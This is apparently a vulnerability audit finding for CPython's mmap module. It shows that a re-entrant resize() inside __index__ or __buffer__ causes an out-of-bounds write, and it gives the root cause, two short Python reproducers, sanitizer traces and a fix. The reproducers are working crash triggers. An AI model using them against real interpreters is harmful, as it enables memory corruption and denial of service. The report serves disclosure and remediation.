# FINDING-001: OOB write in `mmap` subscript assignment via re-entrant `resize()`

- **Parent pattern:** `workflow-0137` — *Reentrant user-code execution invalidates native
  state before later use* (macro_taxo). Sub-family of `workflow-0014` (borrowed/derived
  handle used after mutation invalidates its backing storage).
- **Component:** `Modules/mmapmodule.c`
- **Type:** Out-of-bounds write (SEGV) reachable from pure Python → memory-safety /
  potential corruption. `type-crash`.
- **Confirmed on:** CPython `3.16.0a0`, `origin/main` — reproduced on `8f847875d60`
  and again on `e5d4fa28` (image auto-fetches HEAD). ASan+UBSan build
  (`taxoshop/cpython-asan-ubsan:current`).
- **Duplicate check:** Not a duplicate.
  - #103987 (closed 2023) — `__index__` that *closes* the mmap. Its fix added a second
    `CHECK_VALID` after the conversion. `CHECK_VALID` only tests `self->data == NULL`
    (closed), so it does **not** catch `resize()`, which leaves `data != NULL`.
  - #138204 (closed) — resize *implementation* bug (`resize`-then-`m[:]`), unrelated.
  - No open/closed issue covers re-entrant *resize* during subscript conversion.

## Root cause

`mmap_ass_subscript_lock_held()` validates the target offset against `self->size`, then
performs a **second** user-code-executing conversion before writing through
`self->data`. A re-entrant `mmap.resize()` during that second conversion moves/shrinks
the mapping (`mremap`), invalidating both `self->data` and `self->size`, but the write
proceeds with the stale, pre-resize offset. `CHECK_VALID` does not help because the
object is not *closed* — only resized.

Integer-index path (crash site `mmapmodule.c:1692`):

```c
if (PyIndex_Check(item)) {
    Py_ssize_t i = PyNumber_AsSsize_t(item, PyExc_IndexError);   // 1658
    ...
    if (i < 0 || i >= self->size) { ... }                        // 1665  bounds vs. OLD size
    ...
    v = PyNumber_AsSsize_t(value, PyExc_TypeError);              // 1680  <-- reentrancy: value.__index__() calls mm.resize()
    ...
    CHECK_VALID(-1);                                             // 1689  only checks data==NULL (close), NOT resize
    char v_char = (char) v;
    if (safe_byte_copy(self->data + i, &v_char) < 0)             // 1692  OOB write: i validated vs old size
```

Slice-assignment path (crash site `mmapmodule.c:1724`): `start`/`slicelen` are computed
against `self->size` at line 1704, then `PyObject_GetBuffer(value, ...)` at line 1710
runs `value.__buffer__()`, which can `resize()`; `safe_memcpy(self->data + start, ...)`
at 1724 then writes out of bounds.

Note: on POSIX the `safe_*` copy helpers (`safe_byte_copy`, `safe_memcpy`) are plain
memory writes — `HANDLE_INVALID_MEM` only installs SEH handling on Windows, so there is
no fault interception on Linux/macOS.

The **read** paths (`mmap_subscript_lock_held`, integer and slice) are *not* affected:
they re-read `self->size` after the last conversion, so bounds stay consistent.

## Reproducers

### Vector A — integer index assignment (`value.__index__`)
`audit2/repro/mmap_resize_asssub.py`:

```python
import mmap
mm = mmap.mmap(-1, 100000)          # ~25 pages
class Evil:
    def __index__(self):
        mm.resize(8)                # shrink to 1 page; mapping moves
        return 0
mm[90000] = Evil()                  # index 90000 checked vs OLD size, write after resize
```

### Vector B — slice assignment (`value.__buffer__`)
`audit2/repro/mmap_resize_slice.py`:

```python
import mmap
mm = mmap.mmap(-1, 100000)
class Evil:
    def __buffer__(self, flags):
        mm.resize(8)
        return memoryview(b'\x00' * 10)
mm[90000:90010] = Evil()
```

## Sanitizer output (Vector A) — `audit2/logs/mmap_asssub_index.txt`

```
==1==ERROR: AddressSanitizer: SEGV on unknown address 0xffff81d6cf90 ... WRITE memory access.
    #0 ... in safe_byte_copy Modules/mmapmodule.c:406
    #1 ... in mmap_ass_subscript_lock_held Modules/mmapmodule.c:1692
    #2 ... in mmap_ass_subscript Modules/mmapmodule.c:1750
    #3 ... in _PyEval_EvalFrameDefault Python/generated_cases.c.h:12634
    ...
SUMMARY: AddressSanitizer: SEGV Modules/mmapmodule.c:406 in safe_byte_copy
==1==ABORTING
```

## Sanitizer output (Vector B) — `audit2/logs/mmap_asssub_slice.txt`

```
==1==ERROR: AddressSanitizer: SEGV on unknown address 0xffffb78dcf90 ... WRITE memory access.
    #1 ... in memcpy .../string_fortified.h:29
    #2 ... in safe_memcpy Modules/mmapmodule.c:397
    #3 ... in mmap_ass_subscript_lock_held Modules/mmapmodule.c:1724
    #4 ... in mmap_ass_subscript Modules/mmapmodule.c:1750
    ...
```

## Suggested remediation (informational)

Re-validate the offset against the current `self->size` *after* the final user-code
boundary and before the write (as the read path already does), i.e. move/duplicate the
bounds check to just before `safe_byte_copy`/`safe_memcpy`, and recompute
`start`/`slicelen` after `PyObject_GetBuffer`. `CHECK_VALID` alone is insufficient
because resize keeps `data != NULL`.
